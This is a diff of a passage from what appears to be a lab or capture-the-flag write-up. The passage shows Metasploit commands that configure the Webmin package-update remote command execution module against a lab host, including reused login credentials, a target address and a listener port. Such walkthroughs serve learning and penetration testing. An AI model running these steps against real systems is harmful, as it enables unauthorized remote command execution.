@@ -324,12 +324,17 @@ webmin dashboard
 We perform a search and find that this service is vulnerable to Package Updates Remote Command Execution
 
 ```python
-search webmin
+searched for exploits related to Webmin. 
 
+search webmin 
+I found an exploit that works very well. 
 
+use exploit/linux/http/webmin_packageup_rce 
+
+We used the previously discovered credentials to configure the exploit. msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME support msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD support@123 msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 10.10.10.3 msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4442
 ```
 
-searched for exploits related to Webmin. search webmin I found an exploit that works very well. use exploit/linux/http/webmin_packageup_rce We used the previously discovered credentials to configure the exploit. msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME support msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD support@123 msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 10.10.10.3 msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4442
+
 
 ![[Pasted image 20250513135727.png]]
 
